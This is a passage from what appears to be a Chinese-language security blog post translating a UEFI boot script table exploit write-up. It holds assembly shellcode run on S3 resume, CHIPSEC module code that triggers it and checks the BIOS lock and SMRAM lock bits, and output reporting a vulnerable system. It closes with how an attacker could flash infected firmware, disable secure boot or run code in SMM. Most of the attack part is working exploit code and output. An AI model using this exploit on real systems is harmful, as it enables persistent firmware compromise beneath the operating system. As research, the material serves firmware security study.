class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">[bits 32]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">push    eax                    ; 保存寄存器状态</span><br><span class="line">push    edx</span><br><span class="line">push    esi</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">call    _label                 ; 跳转到payload主代码</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">db      0ffh</span><br><span class="line">dd      0                      ; Shellcode 调用计数器.</span><br><span class="line">db      0                      ; 存放BIOS_CNTL值的数据区。</span><br><span class="line">dd      0                      ; 存储TSEGMB 值的数据区。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_label:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop     esi                    ; 获取shellcode数据区的地址</span><br><span class="line">inc     esi</span><br><span class="line">inc     dword [esi]            ; Shellcode 调用计数器+1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cmp     byte [esi], 1          ; 退出payload(如果它已被调用)</span><br><span class="line">jne     _end</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mov     eax, 0x8000f8dc        ; 可以通过PCI配置空间访问BIOS_CNTL寄存器:</span><br><span class="line">mov     dx, 0xcf8              ; bus = 0, dev = 0x1f, func = 0, offset = 0xdc.</span><br><span class="line">out     dx, eax                ; 设置PCI读取地址</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mov     dx, 0xcfc</span><br><span class="line">in      al, dx                 ; 读取BIOS_CNTL 值.</span><br><span class="line">mov     byte [esi + 4], al     ; 将 BIOS_CNTL  值保存在payload数据区</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mov     eax, 0x800000b8        ;TSEGMB 也可以通过PCI配置空间访问:</span><br><span class="line">mov     dx, 0xcf8              ; bus = 0, dev = 0, func = 0, offset = 0xb8.</span><br><span class="line">out     dx, eax                ; Set up PCI read address.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mov     dx, 0xcfc</span><br><span class="line">in      eax, dx                ; 读取TSEGMB 值.</span><br><span class="line">mov     dword [esi + 5], eax   ;  将 TSEGMB   值保存在payload数据区</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_end:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop     esi                    ; 恢复寄存器状态</span><br><span class="line">pop     edx</span><br><span class="line">pop     eax</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">;</span><br><span class="line">; 下面是钩子函数和32-bit跳转到function_addr + patch_len的原指令</span><br><span class="line">;</span><br></pre></td></tr></table></figure>


<p>现在我们可以使用<a target="_blank" rel="noopener" href="https://linux.die.net/man/8/rtcwake">rtcwake command line utility</a>（在大多数现代Linux系统上都是预装了的）来触发payload执行。当Payload执行时，我们需要从内存中读取它的数据区，并提取记录的BIOS_CNTL 和TSEGMB 寄存器值：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># 定位payload数据区 (9个0字节)</span><br><span class="line">data_offset = payload.find(&#x27;\xff&#x27; + &#x27;\0&#x27; * (4 + 1 + 4))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 从物理内存读取 payload 数据区内容</span><br><span class="line">data = self._mem_read(payload_addr + data_offset + 1, 4 + 1 + 4)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 解析二进制结构</span><br><span class="line">count, BIOS_CNTL, TSEGMB = unpack(&#x27;=IBI&#x27;, data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if count == 0:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    print &#x27;ERROR: shellcode was not executed during S3 resume&#x27;</span><br><span class="line">    return ModuleResult.ERROR</span><br></pre></td></tr></table></figure>


<p>根据原文，在执行引导脚本时，BIOS_CNTL的BLE位都没有设置，TSEGMB的lock位也没有设置。让我们用得到的值来实现这些检查：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"># 在给定的位置获取字节</span><br><span class="line">bitval = lambda val, b: 0L if val &amp; (1L &lt;&lt; b) == 0 else 1L</span><br><span class="line">success = True</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 检查flash访问是否被BIOS_CNTL的bios lock enable位锁定</span><br><span class="line">if bitval(BIOS_CNTL, 1) == 0:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    print &#x27;[!] Bios lock enable bit is not set&#x27;</span><br><span class="line">    success = False</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 检查通过DMA访问SMRAM是否被TSEGMB lock位锁定</span><br><span class="line">if TSEGMB &amp; 1 == 0:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    print &#x27;[!] SMRAM is not locked&#x27;</span><br><span class="line">    success = False</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">return ModuleResult.PASSED if success else ModuleResult.FAILED</span><br></pre></td></tr></table></figure>


<p>显然，最好在shellcode执行期间更充分地检查平台状态，BIOS和SMM还有许多其他的安全特性，不仅仅是这两个方面。为了获取市场上所有主板中可用的SPI flash的完整pwnage，我们需要击败除了BLE位的另一层保护：SPI保护区域。不幸的是，目前我在读取主板上的SPIBAR内容时遇到了问题，这需要从CHIPSEC获取 SPI保护区域的 信息，适用的模块和功能此时也挂起了整个系统。从我知道的其他来源来看，在我的主板上，SPI保护区域应该在引导脚本执行之前就被正确配置过了(也就是flash是安全的)，但在解决了上述技术难题后，我仍然计划在我的模块中添加保护区域的检测功能。SPIBAR访问问题也很有可能与主板的双芯片配置有关(我只见过几次这样的主板)。</p>
<p>使用引导脚本表PoC模块启动CHIPSEC，在我的测试系统中输出如下:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"># python chipsec_main.py --module boot_script_table</span><br><span class="line">[helper] Loaded OS helper: chipsec.helper.linux.helper</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">################################################################</span><br><span class="line">##                                                            ##</span><br><span class="line">##  CHIPSEC: Platform Hardware Security Assessment Framework  ##</span><br><span class="line">##                                                            ##</span><br><span class="line">################################################################</span><br><span class="line">Version 1.1.3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">****** Chipsec Linux Kernel module is licensed under GPL 2.0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] loading platform config from &#x27;/root/chipsec/source/tool/chipsec/cfg/common.xml&#x27;..</span><br><span class="line">[*] loading platform config from &#x27;/root/chipsec/source/tool/chipsec/cfg/avn.xml&#x27;..</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">OS      : Linux 3.2.60 #23 SMP Sun Jan 4 03:02:06 EST 2015 x86_64</span><br><span class="line">Platform: Desktop 2nd Generation Core Processor (Sandy Bridge CPU / Cougar Point PCH)</span><br><span class="line">          VID: 8086</span><br><span class="line">          DID: 0100</span><br><span class="line">CHIPSEC : 1.1.3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] loaded chipsec.modules.boot_script_table</span><br><span class="line">[*] running loaded modules ..</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] running module: chipsec.modules.boot_script_table</span><br><span class="line">[*] Module path: /root/chipsec/source/tool/chipsec/modules/boot_script_table.py</span><br><span class="line">[x][ =======================================================================</span><br><span class="line">[x][ Module: UEFI boot script table vulnerability exploit</span><br><span class="line">[x][ =======================================================================</span><br><span class="line">[*] AcpiGlobalVariable = 0xd5f53f18</span><br><span class="line">[*] UEFI boot script addr = 0xd5f4c018</span><br><span class="line">[*] Target function addr = 0xd5ddf260</span><br><span class="line">8 bytes to patch</span><br><span class="line">Found 79 zero bytes at 0xd5deafb1</span><br><span class="line">Jump from 0xd5deaffb to 0xd5ddf268</span><br><span class="line">Jump from 0xd5ddf260 to 0xd5deafb1</span><br><span class="line">Going to S3 sleep for 10 seconds ...</span><br><span class="line">rtcwake: wakeup from &quot;mem&quot; using /dev/rtc0 at Mon Feb  2 08:07:07 2015</span><br><span class="line">[*] BIOS_CNTL = 0x28</span><br><span class="line">[*] TSEGMB = 0xd7000000</span><br><span class="line">[!] Bios lock enable bit is not set</span><br><span class="line">[!] SMRAM is not locked</span><br><span class="line">[!] Your system is VULNERABLE</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[CHIPSEC] ***************************  SUMMARY  ***************************</span><br><span class="line">[CHIPSEC] Time elapsed          15.136</span><br><span class="line">[CHIPSEC] Modules total         1</span><br><span class="line">[CHIPSEC] Modules failed to run 0:</span><br><span class="line">[CHIPSEC] Modules passed        0:</span><br><span class="line">[CHIPSEC] Modules failed        1:</span><br><span class="line">[-] FAILED: chipsec.modules.boot_script_table</span><br><span class="line">[CHIPSEC] Modules with warnings 0:</span><br><span class="line">[CHIPSEC] Modules skipped 0:</span><br><span class="line">[CHIPSEC] *****************************************************************</span><br><span class="line">[CHIPSEC] Version:   1.1.3</span><br></pre></td></tr></table></figure>


<p>完整的利用脚本源码在<a target="_blank" rel="noopener" href="https://github.com/Cr4sh/UEFI_boot_script_expl">GitHub</a>。<br>为了从漏洞利用中获取一些有利的东西，可以做下面这些事情：</p>
<ul>
<li>如果BLE没有设置，平台固件没有使用SPI保护区域或者它们还没有被配置，攻击者可以运行shellcode并将被感染的固件写入flash中</li>
<li>如果BLE没有设置，但在引导脚本表执行时正确地配置了SPI保护区域，shellcode仍然可以用UEFI变量做很多坏事，例如，禁用安全引导或触发其他固件漏洞。</li>
<li>如果TSEGMB没有被锁定，shellcode可以用一个随机&#x2F;错误的地址锁定它，之后攻击者可以 通过DMA 使用DMA缓冲劫持技术获取对SMRAM的读写访问，并在SMM中运行任意代码（我认为这可能是我进一步研究的一个很好的方向）。Rafal Wojtczuk的<a target="_blank" rel="noopener" href="http://www.blackhat.com/presentations/bh-usa-08/Wojtczuk/BH_US_08_Wojtczuk_Subverting_the_Xen_Hypervisor.pdf">“Subverting the Xen hypervisor”</a>演讲中描述了这种技术。</li>
</ul>

        
      </div>

         
    </div>
    
     
  </div>
  
    
<nav id="article-nav">
  <a class="article-nav-btn left "
    
      href="/project/2023/08/09/%E5%88%A9%E7%94%A8DMA%E6%94%BB%E5%87%BB%E7%AA%81%E7%A0%B4UEFI%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/"
      title="利用DMA攻击突破UEFI安全机制"
     >
    <i class="fa-solid fa-angle-left"></i>
    <p class="title-text">
      
        利用DMA攻击突破UEFI安全机制
        
    </p>
  </a>
  <a class="article-nav-btn right "
    
      href="/project/2023/08/09/%E5%9F%BA%E4%BA%8EUEFI%E5%B9%B3%E5%8F%B0%E7%9A%84SMM%E5%90%8E%E9%97%A8%E6%9E%84%E5%BB%BA/"
      title="基于UEFI平台的SMM后门构建"
     >

    <p class="title-text">
      
        基于UEFI平台的SMM后门构建
        
    </p>
    <i class="fa-solid fa-angle-right"></i>
  </a>
</nav>


  
</article>


  
  <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
  <div id="comment-card" class="comment-card">
    <div class="main-title-bar">
      <div class="main-title-dot"></div>
      <div class="main-title">留言 </div>
    </div>
    <div id="vcomments"></div>
  </div>
  <script>
      new Valine({"enable":true,"appId":"bC8HOSKa4QB7G6TfuGWB97i4-gzGzoHsz","appKey":"aoDFuSX5vWN8Xn1ukZpJ50be","placeholder":"写下你的评论...","pageSize":10,"highlight":true,"serverURLs":null,"el":"#vcomments"});
  </script>
 
    </div>
    <div id="footer-wrapper">
      <footer id="footer">
  
  <div id="footer-info" class="inner">
    
    &copy; 2023 Edvison<br>
    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & Theme <a target="_blank" rel="noopener" href="https://github.com/saicaca/hexo-theme-vivia">Vivia</a>
  </div>
</footer>

    </div>
    <div class="back-to-top-wrapper">
    <button id="back-to-top-btn" class="back-to-top-btn" onclick="topFunction()">
        <span class="material-symbols-rounded">keyboard_arrow_up</span>
    </button>
</div>

<script>
    function topFunction() {
        window.scroll({ top: 0, behavior: 'smooth' });
    }
    let btn = document.getElementById('back-to-top-btn');
    function scrollFunction() {
        if (document.body.scrollTop > 600 || document.documentElement.scrollTop > 600) {
            btn.style.opacity = 1;
        } else {
            btn.style.opacity = 0;
        }
    }
    window.onscroll = function() {
        scrollFunction();
    }
</script>

  </div>
  <script src="/project/js/light-dark-switch.js"></script>
</body>
</html>
